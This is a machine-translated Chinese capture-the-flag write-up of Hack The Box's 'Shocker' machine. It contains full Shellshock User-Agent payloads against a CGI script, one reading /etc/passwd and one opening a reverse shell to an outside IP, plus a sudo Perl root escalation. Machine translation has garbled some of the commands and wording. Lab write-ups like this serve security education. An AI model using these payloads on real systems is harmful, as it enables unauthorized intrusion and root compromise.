<html>
<head>
<title>Shocker From Hackthebox</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子的修卡</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/shocker-from-hackthebox-52378519fb5b?source=collection_archive---------3-----------------------#2022-03-14">https://infosecwriteups.com/shocker-from-hackthebox-52378519fb5b?source=collection_archive---------3-----------------------#2022-03-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="2db3" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Shellshock和Perl等同于修卡</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/645b4d8a314e7cacfe5818f75dba44d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1356/format:webp/1*-bMdqxAlF9QXwOUwrKcDoA.png"/></div></figure><p id="efb6" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">你好，了不起的黑客，我希望你今天做得很好，我们要做的是来自Hackthebox的<strong class="kp ir">修卡</strong>它是一个很容易退役的Linux机器，我们在其中使用<strong class="kp ir"> shellshock </strong>漏洞来获得最初的立足点，我们使用Perl将我们的特权升级到root用户。那么让我们开始吧……</p><p id="d143" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated"><strong class="kp ir">我们需要的工具:- </strong></p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="lj lk l"/></div></figure><p id="cf11" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated"><strong class="kp ir">现在我们将开始nmap扫描:- </strong></p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="lj lk l"/></div></figure><p id="ff83" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">两个端口是开放的，一个是端口80 (http)，另一个是2222(ssh)。我将首先检查端口80(因为它具有更大的攻击面)</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi ll"><img src="../Images/1a900898d01bd812a388711b4b06f909.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oCxEpN_0B0N4HVsVm1ZKcA.png"/></div></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">检查端口80</figcaption></figure><p id="1204" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">嗯，这里没什么有趣的。现在我将尝试目录暴力。过了一会儿，我得到了<strong class="kp ir"> /cgi-bin </strong></p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="lj lk l"/></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">dirb扫描</figcaption></figure><p id="263d" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">然后我试着在<strong class="kp ir"> /cgi-bin </strong>上运行<strong class="kp ir"> go buster </strong>，我得到了<strong class="kp ir"> /user.sh </strong></p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="lj lk l"/></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">Gobuster结果</figcaption></figure><p id="c471" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">我厌倦了检查<strong class="kp ir"> /user.sh </strong>，似乎<a class="ae lu" href="https://www.geeksforgeeks.org/linux-uptime-command-with-examples/" rel="noopener ugc nofollow" target="_blank"> <strong class="kp ir"> uptime </strong> </a>命令正在运行。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi lv"><img src="../Images/0851621e6ae54cb60f02c77b7746e169.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*NqFztsnbgAc1KyVJwE9cnA.png"/></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">checking /user.sh</figcaption></figure><p id="9291" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">所以我想为什么不试试shellshock。你可能想知道shellshock到底是什么？？</p><h2 id="caa7" class="lw lx iq bd ly lz ma dn mb mc md dp me kw mf mg mh la mi mj mk le ml mm mn mo bi translated">简单来说，这是bash中的一个漏洞，使得攻击者能够在使用bash处理请求的面向互联网的web服务器上执行任意命令。</h2><h1 id="7f07" class="mp lx iq bd ly mq mr ms mb mt mu mv me jw mw jx mh jz mx ka mk kc my kd mn mz bi translated">让我们开发……..</h1><h2 id="cd19" class="lw lx iq bd ly lz ma dn mb mc md dp me kw mf mg mh la mi mj mk le ml mm mn mo bi translated">我们将首先手动尝试:-</h2><blockquote class="na nb nc"><p id="1d9f" class="kn ko nd kp b kq kr jr ks kt ku ju kv ne kx ky kz nf lb lc ld ng lf lg lh li ij bi translated">去拦截请求<a class="ae lu" href="http://{ip}/cgi-bin/user.sh" rel="noopener ugc nofollow" target="_blank">http://{ IP }/CGI-bin/user . sh</a>。然后把user-agent改成<strong class="kp ir">(){:；};回声；回声；/bin/bash-c ' cat/etc/passwd '</strong></p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi nh"><img src="../Images/572e7c0e08bb1ffb59e7803e980a5c61.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2Eawk6pQFMTtYIAjcZc7AA.png"/></div></div></figure><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="ni lk l"/></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated"><a class="ae lu" href="https://media.giphy.com/media/sKUFOXcYQnDmpyqJca/giphy.gif" rel="noopener ugc nofollow" target="_blank"><strong class="ak">https://media.giphy.com/media/sKUFOXcYQnDmpyqJca/giphy.gif</strong></a></figcaption></figure><blockquote class="na nb nc"><p id="9d73" class="kn ko nd kp b kq kr jr ks kt ku ju kv ne kx ky kz nf lb lc ld ng lf lg lh li ij bi translated">现在我将尝试获得reverse shell<strong class="kp ir">(){:；};回声；回声；/bin/bash-c ' bash-I&gt;&amp;/dev/TCP/10 . 10 . 14 . 88/1234 0&gt;&amp;1 '清除</strong></p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi nj"><img src="../Images/de2cf4ce78fff003fb49a9d1b1d7fe89.png" data-original-src="https://miro.medium.com/v2/resize:fit:1398/format:webp/1*1bIGtsnrrGEP1Zz5HmR03g.png"/></div></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">获取版本外壳</figcaption></figure><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="ni lk l"/></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated"><a class="ae lu" href="https://media.giphy.com/media/zG8AlgXlmmPWtCNBxJ/giphy.gif" rel="noopener ugc nofollow" target="_blank">https://media.giphy.com/media/zG8AlgXlmmPWtCNBxJ/giphy.gif</a></figcaption></figure><h1 id="f800" class="mp lx iq bd ly mq mr ms mb mt mu mv me jw mw jx mh jz mx ka mk kc my kd mn mz bi translated">现在我们将尝试使用metasploit获取shell</h1><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="lj lk l"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/7068de785606bdd708b0131aabc28c6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*HmSI_-Il8xuYaKzuipVaww.png"/></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">metasploit</figcaption></figure><h1 id="36f5" class="mp lx iq bd ly mq mr ms mb mt mu mv me jw mw jx mh jz mx ka mk kc my kd mn mz bi translated">我们需要将我们的权限提升到根用户</h1><p id="b536" class="pw-post-body-paragraph kn ko iq kp b kq nl jr ks kt nm ju kv kw nn ky kz la no lc ld le np lg lh li ij bi translated">因此，我的方法是始终运行以下命令:-</p><p id="d4a1" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">(I)sudo-version(它给出了sudo版本，我们可以使用该版本来搜索sudo是否易受攻击)</p><p id="3d92" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">(ii) sudo -l(简单地说，它告诉我们用户可以作为根用户或不同用户运行哪个二进制文件)</p><p id="c631" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">(iii) cat /etc/crontab ( <a class="ae lu" href="https://linuxize.com/post/how-to-list-cron-jobs-in-linux/" rel="noopener ugc nofollow" target="_blank">它打印出哪些cronjobs正在运行</a>)。</p><p id="beaa" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">(四)我们不能忘记林豌豆</p><blockquote class="na nb nc"><p id="731a" class="kn ko nd kp b kq kr jr ks kt ku ju kv ne kx ky kz nf lb lc ld ng lf lg lh li ij bi translated">我们可以作为根用户运行Perl。所以让我们去找我们的好朋友<a class="ae lu" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank"> gtfo bin </a>了解一下我们如何以根用户的身份使用Perl来执行命令</p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi nq"><img src="../Images/10a3afbb75d97c96b2915c9e5d874ef0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y8JRG_9733N0xWwJEr8L6g.png"/></div></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">须岛一号</figcaption></figure><p id="c10e" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">我们可以使用这个命令<code class="fe nr ns nt nu b">sudo perl -e 'exec "/bin/sh";'</code>来获得根</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi nv"><img src="../Images/77f5e4d1927552be58151a92096b5ed8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iWatjvwD9hOl4-k2FCYFzg.png"/></div></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">gtfo bin perl</figcaption></figure><p id="cf26" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">我们有了根</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/52c4d37c44b430a9099d27c2d9b27582.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*xI-NH2eqDeKckkEYANcfZw.png"/></div></figure><p id="9535" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">但是等等<strong class="kp ir">什么鬼</strong> <code class="fe nr ns nt nu b">sudo perl -e 'exec "/bin/sh";'</code>？？？</p><p id="bed9" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">我们可以<strong class="kp ir">以<strong class="kp ir"> root </strong>用户身份执行</strong> <strong class="kp ir"> Perl </strong>而无需任何<strong class="kp ir">密码</strong>。并且- <strong class="kp ir"> e </strong> <a class="ae lu" href="https://www.perl.com/pub/2004/08/09/commandline.html/" rel="noopener ugc nofollow" target="_blank">意味着它允许你定义由编译器</a>执行的Perl代码，而<strong class="kp ir"> exec </strong>就像Perl中的一个函数，允许我们运行<strong class="kp ir"> /bin/bash </strong></p><p id="d2de" class="pw-post-body-paragraph kn ko iq kp b kq kr jr ks kt ku ju kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">谢谢你读这篇文章，我很想听到你的反馈，这样我就可以提高我的写作水平。如果你有任何问题，你可以在推特上给我发短信<a class="ae lu" href="https://twitter.com/Hac10101" rel="noopener ugc nofollow" target="_blank">https://twitter.com/Hac10101</a></p></div></div>    
</body>
</html>